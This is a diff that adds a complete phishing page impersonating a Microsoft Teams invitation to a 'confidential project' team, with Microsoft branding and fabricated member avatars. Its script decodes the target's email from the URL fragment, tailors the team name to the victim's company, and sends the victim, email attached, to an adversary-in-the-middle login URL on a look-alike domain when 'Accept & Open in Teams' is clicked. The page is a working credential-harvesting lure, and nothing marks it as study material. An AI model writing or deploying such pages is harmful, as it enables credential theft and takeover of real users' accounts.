@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>You've been added to a team - Microsoft Teams</title>
+<link rel="icon" href="https://statics.teams.cdn.office.net/hashedassets-nocdn/favicon/prod/favicon-teams-192.png">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.08);max-width:500px;width:100%;overflow:hidden}
+.banner{background:#5b5fc7;padding:24px 32px;display:flex;align-items:center;gap:14px}
+.banner svg{width:36px;height:36px}
+.banner h1{color:#fff;font-size:17px;font-weight:600}
+.content{padding:32px}
+.team-card{background:#f8f7ff;border:1px solid #e8e6f7;border-radius:8px;padding:20px;display:flex;align-items:center;gap:16px;margin-bottom:24px}
+.team-icon{width:48px;height:48px;background:#5b5fc7;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:18px}
+.team-name{font-size:15px;font-weight:600;color:#333}
+.team-desc{font-size:12px;color:#666;margin-top:2px}
+.members{display:flex;margin:16px 0;align-items:center}
+.member-avatar{width:28px;height:28px;border-radius:50%;border:2px solid #fff;margin-left:-8px;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:600;color:#fff}
+.member-count{margin-left:8px;font-size:12px;color:#666}
+.message{font-size:13px;color:#555;line-height:1.6;margin-bottom:24px}
+.btn{display:block;width:100%;padding:13px;background:#5b5fc7;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none}
+.btn:hover{background:#4b4fb7}
+.footer{text-align:center;margin-top:20px;font-size:11px;color:#999;line-height:1.5}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="banner">
+    <svg viewBox="0 0 36 36" fill="none"><rect width="36" height="36" rx="4" fill="#5b5fc7"/><path d="M24.5 11h-5a1.5 1.5 0 00-1.5 1.5v11a1.5 1.5 0 001.5 1.5h5a1.5 1.5 0 001.5-1.5v-11a1.5 1.5 0 00-1.5-1.5z" fill="#fff"/><circle cx="14" cy="13" r="3" fill="#fff"/><path d="M10 19h8v4a2 2 0 01-2 2h-4a2 2 0 01-2-2v-4z" fill="#fff" opacity=".8"/></svg>
+    <h1>You've been added to a team</h1>
+  </div>
+  <div class="content">
+    <div class="team-card">
+      <div class="team-icon" id="teamIcon">FP</div>
+      <div>
+        <div class="team-name" id="teamName">Finance - Project Alpha</div>
+        <div class="team-desc" id="teamDesc">Confidential project team</div>
+      </div>
+    </div>
+
+    <div class="members" id="members"></div>
+
+    <p class="message">
+      You've been invited to join this team. Accept the invitation to access shared files, channels, and conversations.
+    </p>
+
+    <a class="btn" id="joinBtn" href="#">Accept & Open in Teams</a>
+
+    <div class="footer">
+      This invitation was sent via Microsoft Teams.<br>
+      &copy; 2026 Microsoft Corporation
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  const hash = window.location.hash.slice(1);
+  const email = hash ? atob(hash) : '';
+  const AITM_URL = 'https://login.hoosiermachlnery.com/AciOKxaR';
+
+  // Generate fake team members
+  const colors = ['#0078d4','#107c10','#d83b01','#8764b8','#008272'];
+  const membersEl = document.getElementById('members');
+  for(let i=0;i<5;i++){
+    const av = document.createElement('div');
+    av.className = 'member-avatar';
+    av.style.background = colors[i];
+    av.style.zIndex = 5-i;
+    av.textContent = String.fromCharCode(65+Math.floor(Math.random()*26)) + String.fromCharCode(65+Math.floor(Math.random()*26));
+    membersEl.appendChild(av);
+  }
+  const countSpan = document.createElement('span');
+  countSpan.className = 'member-count';
+  countSpan.textContent = '12 members';
+  membersEl.appendChild(countSpan);
+
+  if(email){
+    const domain = email.split('@')[1]||'';
+    const company = domain.split('.')[0]||'';
+    if(company){
+      const cap = company.charAt(0).toUpperCase()+company.slice(1);
+      document.getElementById('teamName').textContent = cap+' - Confidential Project';
+      document.getElementById('teamIcon').textContent = cap.substring(0,2).toUpperCase();
+    }
+  }
+
+  document.getElementById('joinBtn').addEventListener('click',function(e){
+    e.preventDefault();
+    this.textContent='Opening Teams...';
+    this.style.background='#444';
+    setTimeout(function(){
+      window.location.href = AITM_URL + (email?'?e='+encodeURIComponent(email):'');
+    },700);
+  });
+})();
+</script>
+</body>
+</html>
